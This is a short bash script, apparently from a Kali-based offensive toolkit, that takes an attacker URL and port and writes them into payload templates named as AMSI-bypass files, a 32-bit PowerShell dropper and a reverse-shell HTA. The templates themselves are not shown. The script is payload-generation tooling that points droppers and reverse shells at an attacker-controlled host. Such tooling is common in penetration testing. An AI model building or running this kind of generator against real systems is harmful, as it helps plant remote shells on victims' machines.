#!/bin/bash
# Usage: bash loadShell.sh <URL> <PORT>

if [ "$#" -ne 2 ]; then
  echo "Usage: bash $0 <URL> <PORT>"
  exit 1
fi

URL=$1
PORT=$2
TEMPLATE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
#TEMPLATE_DIR="/home/kali/shellTemplate"
OUTPUT_DIR="."

files=("am2.txt" "am.txt" "dropperx32.ps1" "reverse.hta")

# Check if template directory exists
if [ ! -d "$TEMPLATE_DIR" ]; then
  echo "Error: Template directory '$TEMPLATE_DIR' not found."
  exit 1
fi


# Loop through the listed files
for file in "${files[@]}"; do
  filepath="$TEMPLATE_DIR/$file"
  if [ -f "$filepath" ]; then
    filename=$(basename "$filepath")
    sed "s|<URL>:<PORT>|${URL}:${PORT}|g" "$filepath" > "${OUTPUT_DIR}/${filename}"
    echo "Generated ${filename}"
  else
    echo "File not found: ${filepath}"
  fi
done

echo "All files processed successfully."

